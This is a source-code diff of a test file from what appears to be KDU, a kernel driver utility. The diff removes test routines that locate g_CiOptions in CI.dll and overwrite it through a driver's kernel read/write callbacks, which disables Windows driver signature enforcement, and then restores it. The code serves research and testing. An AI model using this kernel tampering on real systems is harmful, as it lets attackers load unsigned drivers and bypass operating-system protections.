@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.48
 *
-*  DATE:        29 May 2026
+*  DATE:        30 May 2026
 *
 *  KDU tests.
 *
@@ -18,80 +18,7 @@
 *******************************************************************************/
 
 #include "global.h"
-
-ULONG_PTR DebugQueryCurrentCiOptionsAddress(
-    _In_ ULONG NtBuildNumber,
-    _In_opt_ LPCWSTR DllPath,
-    _In_ BOOL QueryTest
-    )
-{
-    NTSTATUS ntStatus;
-    ULONG loadedImageSize;
-    ULONG_PTR imageLoadedBase;
-    ULONG_PTR kernelAddress;
-    HMODULE mappedImageBase;
-    WCHAR szFullModuleName[MAX_PATH * 2];
-
-    loadedImageSize = 0;
-    kernelAddress = 0;
-    szFullModuleName[0] = 0;
-
-    imageLoadedBase = supGetModuleBaseByName(CI_DLL, &loadedImageSize);
-    if (imageLoadedBase == 0) {
-        printf_s("[!] Could not query loaded base for CI.dll\r\n");
-        return 0;
-    }
-
-    if (QueryTest) {
-        _strcpy(szFullModuleName, DllPath);
-    } 
-    else {
-
-        if (!GetSystemDirectoryW(szFullModuleName, MAX_PATH)) {
-            printf_s("[!] GetSystemDirectoryW failed, gle=%lu\r\n", GetLastError());
-            return 0;
-        }
-
-        _strcat(szFullModuleName, L"\\");
-        _strcat(szFullModuleName, CI_DLL);
-    }
-
-    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
-    if (mappedImageBase == NULL) {
-        printf_s("[!] Could not load CI.dll for pattern search, gle=%lu\r\n", GetLastError());
-        return 0;
-    }
-
-    printf_s("[+] CI.dll mapped at %p for analysis\r\n", mappedImageBase);
-    printf_s("[+] CI.dll loaded kernel base %p, image size 0x%lX\r\n",
-        (PVOID)imageLoadedBase,
-        loadedImageSize);
-
-    ntStatus = KDUQueryCiOptions(
-        mappedImageBase,
-        imageLoadedBase,
-        &kernelAddress,
-        NtBuildNumber);
-
-    if (!NT_SUCCESS(ntStatus)) {
-        printf_s("[!] KDUQueryCiOptions failed, ntstatus=0x%08lX\r\n", ntStatus);
-        FreeLibrary(mappedImageBase);
-        return 0;
-    }
-
-    if (kernelAddress < imageLoadedBase ||
-        kernelAddress >= imageLoadedBase + loadedImageSize)
-    {
-        printf_s("[!] Resolved address %p is outside loaded CI.dll\r\n", (PVOID)kernelAddress);
-        FreeLibrary(mappedImageBase);
-        return 0;
-    }
-
-    printf_s("[+] g_CiOptions resolved at %p\r\n", (PVOID)kernelAddress);
-
-    FreeLibrary(mappedImageBase);
-    return kernelAddress;
-}
+#include "test_dsefix.h"
 
 VOID KDUTestLoad()
 {
@@ -125,45 +52,6 @@ VOID KDUTestLoad()
             printf_s("[+] Provider[%lu] failed to load\r\n", provLoadData->Entries[i].ResourceId);
         }
     }
-}
-
-VOID KDUTestDSE(PKDU_CONTEXT Context)
-{
-    ULONG_PTR g_CiOptions = DebugQueryCurrentCiOptionsAddress(USER_SHARED_DATA->NtBuildNumber, NULL, FALSE);
-    ULONG_PTR oldValue = 0, newValue = 0x0, testValue = 0;
-    KDU_PROVIDER* prov = Context->Provider;
-
-    if (prov->Callbacks.ReadKernelVM) {
-        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &oldValue, sizeof(oldValue));
-        Beep(0, 0);
-    }
-
-    if (prov->Callbacks.WriteKernelVM) {
-        prov->Callbacks.WriteKernelVM(Context->DeviceHandle, g_CiOptions, &newValue, sizeof(newValue));
-        Beep(0, 0);
-    }
-
-    if (prov->Callbacks.ReadKernelVM) {
-        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &testValue, sizeof(testValue));
-
-        if (testValue != newValue)
-            Beep(1, 1);
-    }
-
-    if (prov->Callbacks.WriteKernelVM) {
-        prov->Callbacks.WriteKernelVM(Context->DeviceHandle, g_CiOptions, &oldValue, sizeof(oldValue));
-    }
-}
-
-VOID KDUTestDSEQuery(
-    _In_ ULONG NtBuildNumber
-)
-{
-    ULONG_PTR g_CiOptions = DebugQueryCurrentCiOptionsAddress(NtBuildNumber, L"C:\\Dumps\\CI_26100_8246.dll", TRUE);
-    if (g_CiOptions == 0)
-        printf_s("[!] g_CiOptions not found\r\n");
-    else
-        printf_s("[+] g_CiOptions %llX", g_CiOptions);
 }
 
 BOOL WINAPI TestPhysMemEnumCallback(
@@ -394,6 +282,8 @@ VOID TestSuperfetchWithDriver(PKDU_CONTEXT Context)
 VOID KDUTest()
 {
     PKDU_CONTEXT Context;
+
+    //KDURunCiQueryTests();
 
     //KDUTestLoad();
     //TestSymbols();
